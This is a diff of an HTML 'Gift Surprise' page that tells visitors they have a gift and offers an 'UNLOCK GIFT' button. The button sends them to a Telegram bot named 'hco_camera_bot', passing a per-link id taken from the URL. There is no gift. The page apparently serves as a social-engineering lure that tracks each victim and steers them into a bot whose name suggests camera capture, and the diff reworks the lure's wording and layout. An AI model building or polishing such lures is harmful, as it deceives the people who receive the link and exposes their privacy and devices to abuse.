@@ -1,115 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Gift Surprise</title>
+    <title>🎁 Gift Surprise</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: #000;
+            background: black;
             color: white;
+            text-align: center;
+            font-family: Arial;
             height: 100vh;
+            margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            text-align: center;
             padding: 20px;
         }
-        
         .container {
             max-width: 500px;
-            background: rgba(255,255,255,0.1);
             padding: 30px;
+            background: rgba(255,255,255,0.1);
             border-radius: 20px;
-            backdrop-filter: blur(10px);
             border: 2px solid #ff0080;
         }
-        
         .gift-icon {
             font-size: 80px;
-            margin-bottom: 20px;
+            margin: 20px;
         }
-        
-        h1 {
-            color: #ff0080;
-            margin-bottom: 20px;
-            font-size: 32px;
-        }
-        
-        .message {
-            margin-bottom: 30px;
-            font-size: 18px;
-            line-height: 1.6;
-        }
-        
         .btn {
-            display: block;
-            width: 100%;
-            padding: 20px;
             background: linear-gradient(45deg, #ff0080, #ff8c00);
             color: white;
+            padding: 20px 40px;
             border: none;
-            border-radius: 10px;
             font-size: 20px;
-            font-weight: bold;
+            border-radius: 10px;
+            margin: 20px;
             cursor: pointer;
-            margin-bottom: 15px;
-            text-decoration: none;
+            font-weight: bold;
         }
-        
-        .btn:hover {
-            opacity: 0.9;
-        }
-        
-        .small-text {
-            font-size: 14px;
-            color: #aaa;
-            margin-top: 20px;
-        }
-        
         .loading {
             display: none;
-            font-size: 20px;
-            margin: 20px 0;
+            margin: 20px;
             color: #ff0080;
-        }
-        
-        .gift-id {
-            background: rgba(255,255,255,0.05);
-            padding: 10px;
-            border-radius: 5px;
-            margin: 15px 0;
-            font-family: monospace;
-            word-break: break-all;
-            font-size: 12px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="gift-icon">🎁</div>
-        <h1>YOUR SURPRISE IS HERE!</h1>
+        <h1>YOU HAVE A GIFT!</h1>
+        <p>Click to unlock your surprise:</p>
         
-        <div class="message">
-            Someone sent you a special gift!<br>
-            Click below to unlock your unique gift...
-        </div>
+        <button class="btn" onclick="unlockGift()" id="unlockBtn">UNLOCK GIFT</button>
         
-        <div class="gift-id" id="giftId">Loading gift ID...</div>
+        <div class="loading" id="loading">🎁 Loading gift...</div>
         
-        <button class="btn" onclick="unlockGift()" id="unlockBtn">
-            🔓 UNLOCK YOUR GIFT
-        </button>
-        
-        <div class="loading" id="loading">🎁 Loading gift... Please wait</div>
-        
-        <div class="small-text">
-            Unique one-time gift link
-        </div>
+        <p style="color: #aaa; font-size: 14px; margin-top: 20px;">
+            This will open Telegram to process your gift
+        </p>
     </div>
     
     <script>
@@ -117,15 +64,12 @@
         const urlParams = new URLSearchParams(window.location.search);
         const giftId = urlParams.get('id') || 'UNKNOWN';
         
-        // Display gift ID
-        document.getElementById('giftId').textContent = `Gift ID: ${giftId}`;
-        
         function unlockGift() {
             // Show loading, hide button
             document.getElementById('unlockBtn').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // Open Telegram with unique ID
+            // Open Telegram instantly with unique ID
             window.location.href = `https://t.me/hco_camera_bot?start=unlock_${giftId}`;
         }
         
